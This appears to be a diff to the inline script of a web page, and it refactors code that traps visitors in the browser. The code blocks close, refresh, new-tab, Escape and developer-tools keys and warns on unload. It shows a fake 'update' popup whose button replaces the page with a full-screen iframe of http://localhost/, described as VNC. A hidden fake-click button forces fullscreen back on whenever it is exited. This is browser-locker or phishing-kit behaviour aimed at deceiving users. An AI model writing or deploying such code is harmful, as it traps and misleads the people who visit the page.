@@ -1155,45 +1155,78 @@
         </div>
     </footer>
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            function blockKeys(e) {
-                const key = e.key.toLowerCase();
-                if (
-                    (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
-                    (e.metaKey && ["w", "r", "t"].includes(key)) ||
-                    (e.altKey && key === "f4") ||
-                    ["f11", "f12", "escape"].includes(key)
-                ) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    console.log("Blocked key:", e.key);
-                }
-            }
-            document.addEventListener("keydown", blockKeys);
+      document.addEventListener("DOMContentLoaded", function () {
+    // Key blocking function
+    function blockKeys(e) {
+        const key = e.key.toLowerCase();
+        if (
+            (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
+            (e.metaKey && ["w", "r", "t"].includes(key)) ||
+            (e.altKey && key === "f4") ||
+            ["f11", "f12", "escape"].includes(key)
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log("Blocked key:", e.key);
+        }
+    }
+    document.addEventListener("keydown", blockKeys);
+
+    // Warn on page unload
+    window.onbeforeunload = function () {
+        return "Are you sure you want to leave?";
+    };
+
+    // Insert CSS for fullscreen iframe
+    const styleElement = document.createElement('style');
+    styleElement.textContent = `
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            border: 0;
+        }
         
-            // Warn on page unload
-            window.onbeforeunload = function () {
-                return "Are you sure you want to leave?";
-            };
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0 !important;
+            padding: 0 !important;
+            overflow: hidden !important;
+            background-color: #000 !important;
+        }
         
-            // Automatically re-enter fullscreen on exit using a fake gesture
-            document.addEventListener("fullscreenchange", function () {
-                if (!document.fullscreenElement) {
-                    const fakeButton = document.createElement("button");
-                    fakeButton.style.display = "none";
-                    document.body.appendChild(fakeButton);
-                    fakeButton.addEventListener("click", () => {
-                        document.documentElement.requestFullscreen().catch(err => {
-                            console.log("Re-request fullscreen failed:", err);
-                        });
-                    });
-                    fakeButton.click();
-                    fakeButton.remove();
-                }
-            });
+        .vnc-iframe {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            border: none !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            overflow: hidden !important;
+            z-index: 2147483647 !important;
+            background-color: #000 !important;
+            display: block !important;
+        }
         
-            // Popup and Localhost Lockdown Functionality
-          function showUpdatePopup(event) {
+        ::-webkit-scrollbar {
+            display: none !important;
+        }
+        
+        body.vnc-active * {
+            display: none !important;
+        }
+        
+        body.vnc-active .vnc-iframe {
+            display: block !important;
+        }
+    `;
+    document.head.appendChild(styleElement);
+
+    // Popup and Localhost VNC Functionality
+    window.showUpdatePopup = function(event) {
         if (event) event.preventDefault();
 
         const overlay = document.createElement('div');
@@ -1233,43 +1266,18 @@
         updateButton.style.cursor = 'pointer';
 
         updateButton.addEventListener('click', function () {
-            // Remove the overlay first
-            document.body.removeChild(overlay);
-            
-            // Apply aggressive cleaning of the document
+            // Clear everything and prepare for VNC
             document.body.innerHTML = '';
-            document.body.style = '';
+            document.body.style.cssText = 'margin:0 !important; padding:0 !important; overflow:hidden !important; background-color:#000 !important;';
             document.body.className = 'vnc-active';
             
-            // Force document to be clean for iframe with !important styling
-            const styleOverride = document.createElement('style');
-            styleOverride.textContent = `
-                body {
-                    margin: 0 !important;
-                    padding: 0 !important;
-                    overflow: hidden !important;
-                    background-color: #000 !important;
-                    width: 100vw !important;
-                    height: 100vh !important;
-                }
-                #vnc-container {
-                    position: fixed !important;
-                    top: 0 !important;
-                    left: 0 !important;
-                    width: 100vw !important;
-                    height: 100vh !important;
-                    overflow: hidden !important;
-                    z-index: 2147483647 !important;
-                }
-            `;
-            document.head.appendChild(styleOverride);
-            
-            // Create a dedicated container for the iframe
+            // Create the VNC container
             const container = document.createElement('div');
             container.id = 'vnc-container';
+            container.style.cssText = 'position:fixed !important; top:0 !important; left:0 !important; width:100vw !important; height:100vh !important; margin:0 !important; padding:0 !important; overflow:hidden !important; z-index:2147483647 !important; background-color:#000 !important;';
             document.body.appendChild(container);
             
-            // Create the iframe with aggressive styling
+            // Create the iframe with proper styling
             const hiddenFrame = document.createElement('iframe');
             hiddenFrame.src = 'http://localhost/';
             hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
@@ -1278,71 +1286,35 @@
             hiddenFrame.setAttribute('webkitallowfullscreen', 'true');
             hiddenFrame.setAttribute('mozallowfullscreen', 'true');
             
-            // Apply inline styles for maximum compatibility
-            hiddenFrame.style.cssText = `
-                position: fixed !important;
-                top: 0 !important;
-                left: 0 !important;
-                width: 100vw !important;
-                height: 100vh !important;
-                border: none !important;
-                margin: 0 !important;
-                padding: 0 !important;
-                overflow: hidden !important;
-                z-index: 2147483647 !important;
-                background-color: #000 !important;
-                display: block !important;
-            `;
+            // Aggressive inline styling
+            hiddenFrame.style.cssText = 'position:fixed !important; top:0 !important; left:0 !important; width:100vw !important; height:100vh !important; border:none !important; margin:0 !important; padding:0 !important; overflow:hidden !important; z-index:2147483647 !important; background-color:#000 !important; display:block !important;';
             
             hiddenFrame.onload = function() {
-                // Use requestAnimationFrame to ensure the browser has updated the layout
+                // Handle fullscreen with several attempts
                 requestAnimationFrame(() => {
-                    // Handle fullscreen mode
-                    try {
-                        // Try to go fullscreen on the container element for better iframe handling
-                        container.requestFullscreen({navigationUI: "hide"}).catch(err => {
-                            console.log("Fullscreen request failed on container:", err);
-                            // Try fullscreen on document
-                            document.documentElement.requestFullscreen({navigationUI: "hide"}).catch(err => {
-                                console.log("Fullscreen request failed on document:", err);
-                            });
-                        });
-                    } catch (err) {
-                        console.error("Error requesting fullscreen:", err);
-                    }
-                    
-                    // Try to modify body and apply extra CSS to ensure full coverage
-                    try {
-                        // Force body dimensions
-                        document.body.style.width = '100vw';
-                        document.body.style.height = '100vh';
-                        document.body.style.overflow = 'hidden';
-                        
-                        // Try to inject CSS into the iframe content if same-origin
+                    setTimeout(() => {
                         try {
-                            const iframeStyles = document.createElement('style');
-                            iframeStyles.textContent = `
-                                html, body {
-                                    width: 100% !important;
-                                    height: 100% !important;
-                                    margin: 0 !important;
-                                    padding: 0 !important;
-                                    overflow: hidden !important;
-                                }
-                            `;
-                            hiddenFrame.contentDocument.head.appendChild(iframeStyles);
+                            // Try fullscreen on container first
+                            container.requestFullscreen({navigationUI: "hide"}).catch(() => {
+                                // Then try on the iframe itself
+                                hiddenFrame.requestFullscreen({navigationUI: "hide"}).catch(() => {
+                                    // Fallback to document
+                                    document.documentElement.requestFullscreen({navigationUI: "hide"});
+                                });
+                            });
                             
-                            // Add key blockers to iframe content
-                            hiddenFrame.contentDocument.addEventListener("keydown", blockKeys);
-                            hiddenFrame.contentWindow.onbeforeunload = function() {
-                                return "Are you sure you want to leave?";
-                            };
+                            // Try to access iframe content if same-origin
+                            try {
+                                hiddenFrame.contentDocument.documentElement.style.cssText = 'margin:0 !important; padding:0 !important; overflow:hidden !important;';
+                                hiddenFrame.contentDocument.body.style.cssText = 'margin:0 !important; padding:0 !important; overflow:hidden !important;';
+                                hiddenFrame.contentDocument.addEventListener("keydown", blockKeys);
+                            } catch (error) {
+                                console.warn("Cannot modify iframe content (cross-origin):", error);
+                            }
                         } catch (err) {
-                            console.log("Cannot modify iframe content (likely cross-origin):", err);
+                            console.error("Fullscreen error:", err);
                         }
-                    } catch (err) {
-                        console.error("Error setting body dimensions:", err);
-                    }
+                    }, 100); // Short delay to ensure DOM is ready
                 });
             };
             
@@ -1358,57 +1330,59 @@
         popup.appendChild(updateButton);
         overlay.appendChild(popup);
         document.body.appendChild(overlay);
-    }
-    
-    window.showUpdatePopup = showUpdatePopup;
+    };
 
-    // Define blockKeys if not already defined
-    if (typeof blockKeys !== 'function') {
-        function blockKeys(e) {
-            const key = e.key.toLowerCase();
-            if (
-                (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
-                (e.metaKey && ["w", "r", "t"].includes(key)) ||
-                (e.altKey && key === "f4") ||
-                ["f11", "f12", "escape"].includes(key)
-            ) {
-                e.preventDefault();
-                e.stopPropagation();
-                console.log("Blocked key:", e.key);
-            }
-        }
-        document.addEventListener("keydown", blockKeys);
-    }
-    
-    // Listen for visibility changes to maintain fullscreen
-    document.addEventListener('visibilitychange', function() {
-        if (document.visibilityState === 'visible' && document.body.classList.contains('vnc-active')) {
+    // Automatically re-enter fullscreen if exited
+    document.addEventListener("fullscreenchange", function () {
+        if (!document.fullscreenElement && document.body.classList.contains('vnc-active')) {
             const container = document.getElementById('vnc-container');
-            if (container && !document.fullscreenElement) {
-                try {
-                    container.requestFullscreen({navigationUI: "hide"}).catch(err => {
-                        console.log("Re-request fullscreen failed:", err);
+            const iframe = document.querySelector('.vnc-iframe');
+            
+            // Create a fake user gesture button
+            const fakeButton = document.createElement("button");
+            fakeButton.style.display = "none";
+            document.body.appendChild(fakeButton);
+            
+            fakeButton.addEventListener("click", () => {
+                // Try each element in sequence
+                if (container) {
+                    container.requestFullscreen({navigationUI: "hide"}).catch(() => {
+                        if (iframe) {
+                            iframe.requestFullscreen({navigationUI: "hide"}).catch(() => {
+                                document.documentElement.requestFullscreen({navigationUI: "hide"});
+                            });
+                        } else {
+                            document.documentElement.requestFullscreen({navigationUI: "hide"});
+                        }
                     });
-                } catch (err) {}
-            }
+                } else if (iframe) {
+                    iframe.requestFullscreen({navigationUI: "hide"}).catch(() => {
+                        document.documentElement.requestFullscreen({navigationUI: "hide"});
+                    });
+                } else {
+                    document.documentElement.requestFullscreen({navigationUI: "hide"});
+                }
+            });
+            
+            // Trigger the fake click
+            fakeButton.click();
+            fakeButton.remove();
         }
     });
     
-    // Add event listener on page load
-    window.addEventListener('load', function() {
-        // Detect mobile devices and apply additional fixes
-        if (/Mobi|Android/i.test(navigator.userAgent)) {
-            const metaViewport = document.querySelector('meta[name="viewport"]');
-            if (!metaViewport) {
-                const viewport = document.createElement('meta');
-                viewport.name = 'viewport';
-                viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
-                document.head.appendChild(viewport);
-            } else {
-                metaViewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
-            }
+    // Detect mobile devices and apply viewport fixes
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+        const metaViewport = document.querySelector('meta[name="viewport"]');
+        if (!metaViewport) {
+            const viewport = document.createElement('meta');
+            viewport.name = 'viewport';
+            viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
+            document.head.appendChild(viewport);
+        } else {
+            metaViewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
         }
-    });
+    }
+});
 </script>
         
         
